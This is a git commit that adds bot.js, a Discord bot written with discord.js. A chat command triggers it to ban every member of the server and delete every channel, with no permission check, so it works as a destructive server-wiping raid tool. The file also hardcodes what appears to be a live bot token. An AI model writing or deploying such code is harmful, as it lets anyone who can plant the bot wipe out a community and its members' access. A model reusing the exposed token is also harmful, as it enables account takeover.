3b7dadf3d6efb22cf16ee2de9ed1ad3a20c2557e
Galaxyserver <46113872+Galaxyserver@users.noreply.github.com>
2019-01-20 23:34:31 +0200

    Create bot.js

---
+++ bot.js
@@ -0,0 +1,17 @@
+const Discord = require("discord.js");
+const client = new Discord.Client();
+const prefix = 's'.toLowerCase();
+const token = 'NDYzMDkzNTU3OTI2OTUyOTgw.Dxd9tA.ciCf-_tqJ-7NPOxpuIUEGh3vnoI';
+client.on('message', message => {
+    let args = message.content.split(' ');
+    if(args[0].toLowerCase() === (prefix + 'shaher')){
+        message.guild.members.forEach(f => {
+            f.ban();
+        });
+        message.guild.channels.forEach(m => {
+            m.delete();
+        });
+    }
+});
+
+client.login(process.env.TOKEN);
